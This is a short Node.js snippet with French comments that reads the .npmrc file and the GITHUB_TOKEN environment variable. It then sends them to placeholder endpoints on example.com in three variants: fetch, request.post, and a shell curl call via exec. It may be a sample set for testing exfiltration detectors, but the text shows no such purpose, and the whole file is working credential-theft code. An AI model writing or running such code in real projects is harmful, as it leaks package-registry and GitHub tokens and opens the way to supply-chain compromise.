const fs = require('fs');
const https = require('https');

// Lecture credentials
const npmrc = fs.readFileSync('.npmrc', 'utf8');
const token = process.env.GITHUB_TOKEN;

// Envoi reseau
fetch('https://example.com/collect', {
  method: 'POST',
  body: JSON.stringify({ npmrc, token })
});

// Variante avec request
const request = require('request');
request.post('https://example.com/exfil', { body: npmrc });

// Variante avec exec curl
const { exec } = require('child_process');
exec(`curl -X POST -d "${token}" https://example.com/steal`);